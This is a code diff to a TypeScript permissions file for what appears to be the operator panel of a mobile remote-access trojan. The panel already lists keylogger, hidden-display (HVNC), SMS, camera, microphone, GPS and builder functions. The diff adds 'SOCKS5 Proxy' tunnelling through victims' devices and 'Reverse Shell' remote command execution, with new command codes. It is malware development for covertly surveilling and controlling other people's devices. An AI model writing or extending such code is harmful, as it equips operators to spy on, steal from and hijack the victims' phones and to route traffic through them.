@@ -19,6 +19,8 @@ export type Permission =
   | 'device:screen'
   | 'device:hvnc'
   | 'device:keylogger'
+  | 'device:proxy'
+  | 'device:shell'
   | 'device:command'
   | 'device:delete'
   | 'builder:access'
@@ -34,7 +36,7 @@ export const ALL_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
   'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
-  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:command',
+  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:proxy', 'device:shell', 'device:command',
   'device:delete',
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
   'settings:view', 'settings:edit', 'stats:view', 'files:download',
@@ -44,7 +46,7 @@ export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
   'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
-  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:command',
+  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:proxy', 'device:shell', 'device:command',
   'logs:view', 'settings:view',
 ];
 
@@ -70,6 +72,8 @@ export const PERMISSION_GROUPS = [
        { key: 'device:screen' as Permission, label: 'Live Screen', description: 'Live screen streaming and remote control' },
        { key: 'device:hvnc' as Permission, label: 'HVNC', description: 'Hidden virtual display control' },
        { key: 'device:keylogger' as Permission, label: 'Keylogger', description: 'View captured keystroke data' },
+       { key: 'device:proxy' as Permission, label: 'SOCKS5 Proxy', description: 'Network proxy tunneling through device' },
+       { key: 'device:shell' as Permission, label: 'Reverse Shell', description: 'Remote shell command execution' },
       { key: 'device:command' as Permission, label: 'Send Commands', description: 'Send commands to devices' },
       { key: 'device:delete' as Permission, label: 'Delete Devices', description: 'Remove devices and their data' },
     ],
@@ -130,6 +134,8 @@ export const CMD = {
    HVNC_ANSWER: '0xHA',
    HVNC_ICE: '0xHI',
    PASSKEY: '0xPK',
+   PROXY: '0xPY',
+   SHELL: '0xSH',
 } as const;
 
 export type CmdType = typeof CMD[keyof typeof CMD];
